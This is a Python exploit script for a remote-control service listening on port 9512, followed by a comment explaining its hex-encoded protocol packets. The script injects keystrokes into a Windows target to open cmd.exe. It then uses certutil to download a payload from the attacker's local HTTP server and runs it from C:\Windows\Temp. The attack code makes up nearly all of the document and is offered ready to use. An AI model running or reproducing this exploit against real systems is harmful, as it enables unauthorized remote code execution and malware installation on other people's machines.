#!/usr/bin/python

import socket
import sys
from time import sleep

# Define constants
PORT = 9512

# Predefined packets (hex-decoded data)
PACKETS = {
    "open": bytes.fromhex("00000085000108416374696f6e00000550617373776f72640038653831333362332d613138622d343361662d613763642d6530346637343738323763650005506c6174666f726d00616e64726f6964000852657175657374000005536f7572636500616e64726f69642d64373038653134653532383463623831000356657273696f6e000000000a00"),
    "open_fin": bytes.fromhex("000000c8000108416374696f6e0001024361706162696c69746965730004416374696f6e73000104456e6372797074696f6e3200010446617374000004477269640001044c6f6164696e6700010453796e630001000550617373776f72640064363334633164636664656238373335363038613461313034646564343037366465373636646436313434333631393830396164376633353835386434343932000852657175657374000105536f7572636500616e64726f69642d643730386531346535323834636238310000"),
    "win_key": bytes.fromhex("000000d8000108416374696f6e00070549440052656c6d746563682e4b6579626f61726400024c61796f75740006436f6e74726f6c73000200024f6e416374696f6e0002457874726173000656616c7565730002000556616c7565004c57494e00000000054e616d6500746f67676c65000008547970650008000000085265717565737400070252756e0002457874726173000656616c7565730002000556616c7565004c57494e00000000054e616d6500746f67676c65000005536f7572636500616e64726f69642d643730386531346535323834636238310000"),
    "ret_key": bytes.fromhex("000000dc000108416374696f6e00070549440052656c6d746563682e4b6579626f61726400024c61796f75740006436f6e74726f6c73000200024f6e416374696f6e0002457874726173000656616c7565730002000556616c75650052455455524e00000000054e616d6500746f67676c65000008547970650008000000085265717565737400070252756e0002457874726173000656616c7565730002000556616c75650052455455524e00000000054e616d6500746f67676c65000005536f7572636500616e64726f69642d643730386531346535323834636238310000"),
    "space_key": bytes.fromhex("000000da000108416374696f6e00070549440052656c6d746563682e4b6579626f61726400024c61796f75740006436f6e74726f6c73000200024f6e416374696f6e0002457874726173000656616c7565730002000556616c756500535041434500000000054e616d6500746f67676c65000008547970650008000000085265717565737400070252756e0002457874726173000656616c7565730002000556616c756500535041434500000000054e616d6500746f67676c65000005536f7572636500616e64726f69642d643730386531346535323834636238310000"),
}

# ASCII to Hex Conversion Table
CHARACTERS = {chr(i): f"{i:02x}" for i in range(32, 127)}

# Command-line argument validation
if len(sys.argv) != 4:
    print(f"Usage: python {sys.argv[0]} <target-ip> <local-http-ip> <payload-name>")
    sys.exit(1)

rhost, lhost, payload = sys.argv[1], sys.argv[2], sys.argv[3]

# Send packets
def send_packet(data):
    target.sendto(data, (rhost, PORT))
    sleep(0.4)

# Simulate sending a string as keystrokes
def send_string(string):
    for char in string:
        if char == " ":
            send_packet(PACKETS["space_key"])
        else:
            char_hex = bytes.fromhex(CHARACTERS[char])
            send_packet(PACKETS["win_key"] + char_hex + PACKETS["ret_key"] + char_hex)

# Main function
def main():
    global target
    target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target.connect((rhost, PORT))
    print("[+] Connected to target")

    # Initialize the connection
    send_packet(PACKETS["open"])
    send_packet(PACKETS["open_fin"])
    print("[+] Initialized connection")

    # Open Start Menu and Command Prompt
    send_packet(PACKETS["win_key"])
    print("[+] Opening Start Menu")
    send_string("cmd.exe")
    send_packet(PACKETS["ret_key"])
    print("[+] Opened CMD")

    # Download and execute the payload
    command = f"certutil.exe -f -urlcache http://{lhost}/{payload} C:\\Windows\\Temp\\{payload}"
    send_string(command)
    send_packet(PACKETS["ret_key"])
    print("[+] Downloaded payload")

    execute_command = f"C:\\Windows\\Temp\\{payload}"
    send_string(execute_command)
    send_packet(PACKETS["ret_key"])
    print("[+] Executed payload")
    target.close()

if __name__ == "__main__":
    main()


/*
The provided dictionary (PACKETS) contains pre-defined binary data for specific commands or actions that the script sends to the target. These binary sequences are represented in hexadecimal (base-16) format and then decoded into bytes using Python's bytes.fromhex() function.

Each key in the dictionary (e.g., "open", "open_fin", "win_key") represents a specific action or keypress encoded in a protocol that the target system understands. These actions are often part of a proprietary or reverse-engineered protocol used for remote communication or control.

Breaking Down an Entry
Let’s take the "open" entry as an example:

"open": bytes.fromhex("00000085000108416374696f6e00000550617373776f72640038653831333362332d613138622d343361662d613763642d6530346637343738323763650005506c6174666f726d00616e64726f6964000852657175657374000005536f7572636500616e64726f69642d64373038653134653532383463623831000356657273696f6e000000000a00"),
Hexadecimal Data:
The string "00000085000108416374696f6e..." is a sequence of hexadecimal values.
Each pair of hexadecimal characters (00, 85, 01, etc.) represents a single byte of data.
Decoded to Bytes:
bytes.fromhex() converts this hexadecimal string into raw binary data (a bytes object in Python). This is how binary messages are typically constructed in networking.
Structure of the Data:
In many protocols, data is structured in fields such as:
Message Length: The first few bytes might indicate the size of the message (e.g., 00000085).
Command Identifier: Some bytes represent the type of command or action (e.g., 08416374696f6e might correspond to a command like "Action").
Data Payload: Other bytes carry the actual content or parameters needed for the command.
Checksum or Footer: Some protocols append a checksum or end marker.

Purpose:
                                                                      
                                                                       
The "open" packet is likely used to initialize or establish communication with the target. It might include information like:
An identifier for the action (e.g., "open").
Authentication data (e.g., a password or token).
Version or protocol details.

Other Entries
Similarly, other entries like "open_fin", "win_key", "ret_key", and "space_key" represent specific commands or keypresses in this protocol.

"win_key": Likely simulates pressing the "Windows key" on a keyboard.
"ret_key": Likely simulates pressing the "Enter/Return key."
"space_key": Represents pressing the spacebar key.
"open_fin": Possibly finalizes the initialization process (e.g., confirming a successful connection).

How This Fits in the Script
These packets are sent to the target using the send_packet() function.
For instance, the "win_key" packet is sent to simulate opening the Start Menu on the target system:
send_packet(PACKETS["win_key"])

Reverse-Engineering Context
This kind of byte-level communication is typical in scenarios where:

A custom protocol has been reverse-engineered for remote communication.
Specific packets were captured (e.g., through tools like Wireshark) and analyzed for their functionality.
If you're working on penetration testing, understanding such binary protocols often involves:

Capturing packets with tools like Wireshark or tcpdump.
Analyzing the protocol's behavior and fields.
Crafting similar packets to exploit or control the system.

*/
